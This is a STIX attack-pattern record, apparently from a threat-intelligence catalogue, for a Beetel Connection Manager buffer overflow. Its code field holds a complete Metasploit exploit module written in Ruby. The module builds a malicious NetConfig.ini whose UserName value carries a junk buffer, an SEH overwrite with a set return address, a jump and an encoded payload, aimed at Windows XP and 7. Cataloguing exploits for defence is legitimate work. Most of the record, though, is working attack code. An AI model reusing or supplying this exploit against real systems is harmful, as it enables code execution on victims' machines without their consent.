{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2f6c9645-86af-4a83-a9a7-7e03c81bfaea",
    "created": "2024-08-14T16:37:08.561737Z",
    "modified": "2024-08-14T16:37:08.561742Z",
    "name": "\"Beetel Connection Manager NetConfig.ini Buffer Overflow\"",
    "description": " This module exploits a stack-based buffer overflow in Beetel Connection Manager. The vulnerability exists in the parsing of the UserName parameter in the NetConfig.ini file.  The module has been tested successfully against version PCW_BTLINDV1.0.0B04 on Windows XP SP3 and Windows 7 SP1.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/beetel_netconfig_ini_bof.rb",
            "external_id": "beetel_netconfig_ini_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => \"Beetel Connection Manager NetConfig.ini Buffer Overflow\",\n      'Description' => %q{\n        This module exploits a stack-based buffer overflow in Beetel Connection\n        Manager. The vulnerability exists in the parsing of the UserName\n        parameter in the NetConfig.ini file.\n\n        The module has been tested successfully against version\n        PCW_BTLINDV1.0.0B04 on Windows XP SP3 and Windows 7 SP1.\n      },\n      'License' => MSF_LICENSE,\n      'Author' => [\n        \"metacom\", # Vuln/PoC\n        \"wvu\" # Metasploit\n      ],\n      'References' => [\n        [\"OSVDB\", \"98714\"],\n        [\"EDB\", \"28969\"]\n      ],\n      'Payload' => {\n        \"Space\" => 1504,\n        \"BadChars\" => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\",\n        \"DisableNops\" => true\n      },\n      'Platform' => \"win\",\n      'Targets' => [\n        [\"PCW_BTLINDV1.0.0B04 (WinXP SP3, Win7 SP1)\", {\n          \"Offset\" => 468,\n          \"Ret\" => 0x0105e2f6 # p/p/r (WaitingForm.dll 1.0.0.0)\n        }]\n      ],\n      'Privileged' => false,\n      'DisclosureDate' => \"2013-10-12\",\n      'DefaultTarget' => 0\n    ))\n\n    register_options([\n      OptString.new(\"FILENAME\", [true, \"INI file\", \"NetConfig.ini\"]),\n      OptString.new(\"SECTION\", [true, \"Section name\", \"Edit Me\"])\n    ])\n  end\n\n  def exploit\n    section = datastore[\"SECTION\"]\n\n    sploit = \"[#{section}]\\r\\nUserName=#{shell_popper}\"\n\n    file_create(sploit)\n  end\n\n  def shell_popper\n    junk = rand_text(target[\"Offset\"])\n    seh = generate_seh_record(target.ret)\n    jump = Rex::Arch::X86.jmp_short(66)\n    padding = rand_text(66) # Pad past buffer corruption\n\n    junk + seh + jump + padding + payload.encoded\n  end\nend\n",
    "x_mitre_disclosure_date": "\"2013-10-12\"",
    "x_mitre_platforms": [
        "\"win\""
    ]
}